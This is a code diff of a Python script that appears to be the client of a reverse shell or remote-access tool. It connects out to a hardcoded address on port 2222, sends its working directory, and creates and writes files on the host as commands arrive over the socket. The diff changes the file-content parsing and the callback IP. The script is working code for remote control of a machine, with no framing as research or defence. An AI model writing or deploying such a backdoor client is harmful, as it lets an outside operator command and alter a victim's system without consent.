@@ -71,18 +71,25 @@ def create_thing(get_cmd,sock):
     file_type = cmd[1]
     if file_type == 'file':
         if cmd[2] and cmd[3]:
-            getpos = [_index for _index,_char in enumerate(cmd[3]) if _index == '"']
-            if '"' in content and content.count('"') == 2:
-                content = content[1:len(content)-1]
-                try:
-                    with open(cmd[2],'w') as wfile:
-                        wfile.write(content)
-                        sock.send(f'The file \'{cmd[2]}\' created and content written'.encode())
-                    wfile.close()
-                except Exception as err:
-                    sock.send(str(err).encode())
-            else:
-                sock.send('Syntax : touch file <file_name> "<content>"'.encode())        
+            try:
+                file_name = str(cmd[2])
+                getposes = []
+
+                for pos,arg in enumerate(cmd):
+                    if '"' in arg:
+                        getposes.append(pos)
+
+                f_content = ''
+                for _content in range(getposes[0],getposes[1]+1):
+                    f_content += cmd[_content] + ' '
+                
+                with open(file_name,'w') as wfile:
+                    wfile.write(f_content.replace('"',''))
+                    sock.send(f'The file \'{file_name}\' created and content written'.encode())
+                wfile.close()
+            except Exception as err:
+                sock.send(str(err).encode())  
+                  
         elif cmd[2] and not cmd[3]:
             try:
                 with open(cmd[2],'w') as wfile:
@@ -113,7 +120,7 @@ def create_thing(get_cmd,sock):
 
 def main_root():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.6.229',2222))
+    sock.connect(('192.168.6.32',2222))
 
     while True:
         sock.send(os.getcwd().encode())
